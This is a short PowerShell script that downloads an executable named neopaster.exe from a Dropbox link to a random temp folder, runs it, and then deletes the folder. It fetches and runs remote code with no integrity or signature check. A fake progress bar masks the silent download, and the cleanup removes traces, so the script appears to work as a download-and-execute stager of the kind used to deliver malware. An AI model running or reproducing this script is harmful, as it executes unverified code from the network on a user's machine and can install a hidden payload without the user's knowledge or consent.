$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"
$tempdir = "$env:TEMP\$(New-Guid)"
$file = "$tempdir\app.exe"

try {
    # Create temp directory
    mkdir $tempdir -Force | Out-Null

    # Start progress display
    $job = Start-Job -ScriptBlock {
        $i = 0
        while ($true) {
            Write-Progress -Activity "Downloading File" -Status "Progress" -PercentComplete (($i++ % 100))
            Start-Sleep -Milliseconds 100
        }
    }

    # Download with suppressed output
    $ProgressPreference = 'SilentlyContinue'
    Invoke-RestMethod -Uri $url -OutFile $file -ErrorAction Stop *>&1 | Out-Null

    # Stop progress display
    $job | Stop-Job -PassThru | Remove-Job -Force
    Write-Progress -Completed -Activity "Downloading File"

    # Execute file
    Write-Host "Launching application..." -ForegroundColor Yellow
    $proc = Start-Process $file -PassThru -Wait
    Write-Host "Exit code: $($proc.ExitCode)" -ForegroundColor Cyan

}
catch {
    Write-Error "ERROR: $_"
}
finally {
    # Cleanup
    Remove-Item $tempdir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Cleanup completed" -ForegroundColor DarkGray
}
